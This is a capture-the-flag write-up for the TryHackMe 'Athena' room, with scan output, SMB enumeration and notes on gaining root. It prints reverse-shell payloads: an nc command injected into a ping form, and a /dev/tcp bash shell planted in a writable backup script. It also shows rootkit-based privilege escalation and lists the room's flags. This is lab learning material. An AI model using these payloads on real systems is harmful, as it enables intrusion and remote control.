# BOX NAME: Athena
**LINK**: https://tryhackme.com/room/4th3n4

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate box - find hints on smb
2. command substitution to get a revshell
3. manipulate a backup.sh to pivot to other user
4. use already present rootkit to gain root.
5. Cool stuff


https://github.com/m0nad/Diamorphine
https://www.youtube.com/watch?v=_MXlQSDHQ08

Full disclosure. I was not able to crack this box without looking up hints from walkthroughs
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.10.133.162
[+] URL:	http://athena.thm
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap $IP            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-04 23:33 CET
Nmap scan report for athena.thm (10.10.133.162)
Host is up (0.080s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds



─$ nmap -v -A $IP -oN nmap-full.log                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-04 23:34 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 23:34
Completed NSE at 23:34, 0.00s elapsed
Initiating NSE at 23:34
Completed NSE at 23:34, 0.00s elapsed
Initiating NSE at 23:34
Completed NSE at 23:34, 0.00s elapsed
Initiating Ping Scan at 23:34
Scanning 10.10.133.162 [2 ports]
Completed Ping Scan at 23:34, 0.06s elapsed (1 total hosts)
Initiating Connect Scan at 23:34
Scanning athena.thm (10.10.133.162) [1000 ports]
Discovered open port 80/tcp on 10.10.133.162
Discovered open port 22/tcp on 10.10.133.162
Discovered open port 445/tcp on 10.10.133.162
Discovered open port 139/tcp on 10.10.133.162
Completed Connect Scan at 23:34, 2.94s elapsed (1000 total ports)
Initiating Service scan at 23:34
Scanning 4 services on athena.thm (10.10.133.162)
Completed Service scan at 23:35, 14.71s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.133.162.
Initiating NSE at 23:35
Completed NSE at 23:35, 18.05s elapsed
Initiating NSE at 23:35
Completed NSE at 23:35, 0.66s elapsed
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
Nmap scan report for athena.thm (10.10.133.162)
Host is up (0.076s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3b:c8:f8:13:e0:cb:42:60:0d:f6:4c:dc:55:d8:3b:ed (RSA)
|   256 1f:42:e1:c3:a5:17:2a:38:69:3e:9b:73:6d:cd:56:33 (ECDSA)
|_  256 7a:67:59:8d:37:c5:67:29:e8:53:e8:1e:df:b0:c7:1e (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Athena - Gods of olympus
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: ROUTERPANEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ROUTERPANEL<00>      Flags: <unique><active>
|   ROUTERPANEL<03>      Flags: <unique><active>
|   ROUTERPANEL<20>      Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   SAMBA<00>            Flags: <group><active>
|   SAMBA<1d>            Flags: <unique><active>
|_  SAMBA<1e>            Flags: <group><active>
| smb2-time: 
|   date: 2024-01-04T22:35:11
|_  start_date: N/A
|_clock-skew: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.61 seconds



└─$ jml-scanner -u $IP -p 65535

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|J|M|L|-|P|O|R|T|S|C|A|N|N|E|R|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+


[+] Port 22 is open.
[+] Port 80 is open.
[+] Port 139 is open.
[+] Port 445 is open.

[+] A total of 4 found ports open  
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```

```

nikto-scan
```

```

fuzzing
```

```
other
```

```

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SMB/SAMBA
```
 ===========================( Password Policy Information for 10.10.133.162 )===========================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

[+] Attaching to 10.10.133.162 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] ROUTERPANEL
        [+] Builtin

[+] Password Info for Domain: ROUTERPANEL

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 

=================================( Share Enumeration on 10.10.133.162 )=================================
                                                                                                                                                                                                                                            
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                                                                                                                       

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 10.10.133.162 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.133.162                                                                                                                                                                                               
                                                                                                                                                                                                                                            
testing write access public                                                                                                                                                                                                                 
//10.10.133.162/public  Mapping: OK Listing: OK Writing: DENIED

[E] Can't understand response:                                                                                                                                                                                                              
                                                                                                                                                                                                                                            
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                                                                                  
//10.10.133.162/IPC$    Mapping: N/A Listing: N/A Writing: N/A


[+] Enumerating users using SID S-1-22-1 and logon username '', password                               
S-1-22-1-1000 Unix User\ubuntu (Local User)                                                            
S-1-22-1-1001 Unix User\athena (Local User)
```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1.
2.
3.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
#Using PSPY64

/usr/share/backup/backup.sh is writable and owned by user athena.


###########

2024/01/04 23:51:34 CMD: UID=0    PID=10     | 
2024/01/04 23:51:34 CMD: UID=0    PID=1      | /sbin/init auto noprompt 
2024/01/04 23:52:07 CMD: UID=0    PID=33070  | (t-helper) 
2024/01/04 23:52:08 CMD: UID=0    PID=33071  | /usr/lib/apt/apt-helper wait-online 
2024/01/04 23:52:09 CMD: UID=0    PID=33072  | /usr/lib/apt/apt-helper wait-online 
2024/01/04 23:52:10 CMD: UID=0    PID=33073  | systemctl is-active -q NetworkManager.service 
2024/01/04 23:52:10 CMD: UID=0    PID=33074  | /usr/lib/apt/apt-helper wait-online 
2024/01/04 23:52:13 CMD: UID=1001 PID=33078  | /bin/bash /usr/share/backup/backup.sh 
2024/01/04 23:52:14 CMD: UID=1001 PID=33079  | /bin/bash /usr/share/backup/backup.sh 
2024/01/04 23:52:14 CMD: UID=1001 PID=33080  | /bin/bash /usr/share/backup/backup.sh 
2024/01/04 23:52:14 CMD: UID=1001 PID=33081  | 
2024/01/04 23:52:14 CMD: UID=1001 PID=33082  | /bin/bash /usr/share/backup/backup.sh 
2024/01/04 23:52:15 CMD: UID=1001 PID=33085  | bash -i 
2024/01/04 23:52:15 CMD: UID=1001 PID=33084  | bash -c bash -i &> /dev/tcp/10.18.33.122/4445 0>&1 
2024/01/04 23:52:15 CMD: UID=1001 PID=33086  | bash -i 
2024/01/04 23:52:15 CMD: UID=1001 PID=33087  | /bin/sh /usr/bin/lesspipe 
2024/01/04 23:52:15 CMD: UID=1001 PID=33091  | bash -i 


############


```

**SUID's**:

```

```
**SGID's**:

```

```
**OTHERS (HINTS AND CLUES)**:

```
└─$ cat msg_for_administrator.txt 

Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern

```
```
on /myrouterpanel we use command substitution to foold the ping app.

127.0.0.1 $(sleep 10)
127.0.0.1 $(nc 10.18.33.122 4444 -e /bin/sh)

```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```
www-data@routerpanel:/tmp$ file /bin/bash ; echo -e " \n" && lsb_release -a ; echo -e "\n" && uname -a
/bin/bash: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2a9f157890930ced4c3ad0e74fc1b1b84aad71e6, for GNU/Linux 3.2.0, stripped
 
No LSB modules are available.
Distributor ID: Ubuntu                                                                                 
Description:    Ubuntu 20.04.6 LTS                                                                                                   
Release:        20.04                                                                                  Codename:       focal                                                                                                                                                   
Linux routerpanel 5.15.0-69-generic #76~20.04.1-Ubuntu SMP Mon Mar 20 15:54:19 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
ubuntu
athena
```
</details>


<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
Load the already present rootkit:
sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
kill -57 0

athena@routerpanel:/$ id
uid=0(root) gid=0(root) groups=0(root),1001(athena)

More information about the final payload in the summary steps at the top.
```

```
Userflag: 857c4a4fbac638afb6c7ee45eb3e1a28
Rootflag: aecd4a3497cd2ec4bc71a2315030bd48
```

```

```

</details>